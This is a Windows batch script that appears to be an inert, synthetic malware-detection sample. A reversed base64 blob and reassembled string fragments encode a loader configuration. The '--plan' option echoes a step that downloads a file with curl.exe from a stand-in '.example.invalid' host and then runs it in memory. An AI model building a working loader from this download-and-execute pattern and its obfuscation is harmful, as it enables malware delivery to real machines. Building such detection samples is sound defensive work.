@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:plain_fragments|reverse

rem HUNTRESS-MATERIAL:dGFkLjNlY2Y5OTk0L2RpbGF2bmkuZWxwbWF4ZS4yMzU3ODhkOWY3Ly86c3B0dGg9bHJ1fDIzNTc4OGQ5ZjctbmdpYXBtYWM9ZGlfbmdpYXBtYWN8ZW5vbj1lZ2F1Z25hbF90eGVufHR1b19uYWY9aHBhcmd8MT10bnVvY19lZ2F0c3xleGUubHJ1Yz1yZXRwYWRhfHlyb21lbV9oY3RhcHNpZCxldG9tZXJfZXJpdXFjYT1zcGV0c3wxPXY=

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set "fragment0=v=1|steps=acquire_remote,dispatch_memory|adapte"& rem HUNTRESS quote compound
set "fragment1=r=curl.exe|stage_count=1|graph=fan_out|next_lan"& rem HUNTRESS quote compound
set "fragment2=guage=none|campaign_id=campaign-7f9d887532|url="& rem HUNTRESS quote compound
set "fragment3=https://7f9d887532.example.invalid/4999fce3.dat"& rem HUNTRESS quote compound

goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE

set "neutral_dead_label=8b5df11c"

goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "recovered_configuration=!fragment0!!fragment1!!fragment2!!fragment3!"

echo(!recovered_configuration!

exit /b 0

:HUNTRESS_PLAN

echo curl.exe GET https://7f9d887532.example.invalid/4999fce3.dat then dispatch memory

exit /b 0

